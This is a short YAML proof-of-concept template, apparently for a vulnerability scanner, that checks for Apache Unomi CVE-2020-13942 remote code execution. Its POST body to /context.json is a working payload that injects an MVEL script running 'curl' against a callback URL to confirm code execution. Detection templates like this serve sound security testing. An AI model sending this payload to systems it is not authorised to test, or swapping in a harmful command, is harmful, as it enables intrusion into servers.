name: poc-yaml-apache-unomi-cve-2020-13942-rce
set:
  r1: randomLowercase(8)
  reverse: newReverse()
  reverseURL: reverse.url
rules:
  - method: POST
    path: /context.json
    headers:
      Content-Type: application/json
    body: >-
      {"filters":[{"id":"{{r1}}","filters":[{"condition":{"parameterValues":{"":"script::Runtime r = Runtime.getRuntime(); r.exec(\"curl {{reverseURL}}\");"},"type":"profilePropertyCondition"}}]}],"sessionId":"{{r1}}"}
    follow_redirects: true
    expression: |
      response.status == 200 && reverse.wait(10) && response.body.bcontains(bytes(r1))
detail:
  author: moonD4rk(https://github.com/moonD4rk/)
  links:
    - https://www.ddosi.com/b520/
    - https://securityboulevard.com/2020/11/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/
